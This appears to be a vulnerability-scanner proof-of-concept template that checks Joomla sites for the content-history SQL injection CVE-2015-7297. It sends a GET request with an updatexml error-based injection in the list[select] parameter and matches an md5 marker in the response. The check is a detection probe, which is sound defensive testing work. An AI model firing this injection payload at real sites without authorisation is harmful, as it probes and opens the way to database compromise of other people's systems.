name: yaml-poc-joomla-joomla-sql_injection-CVE-2015-7297
binding: 9e56b319-cfcb-463e-82ca-87b4f97ad54e
detail:
    author: system_user
    links:
        - http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html
        - http://packetstormsecurity.com/files/134097/Joomla-3.44-SQL-Injection.html
        - http://packetstormsecurity.com/files/134494/Joomla-Content-History-SQL-Injection-Remote-Code-Execution.html
        - http://www.rapid7.com/db/modules/auxiliary/gather/joomla_contenthistory_sqli
        - http://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_contenthistory_sqli_rce
        - http://www.securityfocus.com/bid/77295
        - http://www.securitytracker.com/id/1033950
        - https://www.exploit-db.com/exploits/38797/
        - https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/
        - https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/?page=1&year=0&month=0
    vulnerability:
        id: defaa5fd-790c-4b63-8825-dbda2c33d3a1
        level: medium
    warning: Harmless
transport: http
set:
    r1: randomInt(10000000, 50000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5({{r1}})),1)
        expression: response.body_string.contains(md5(string(r1)))
expression: r0()
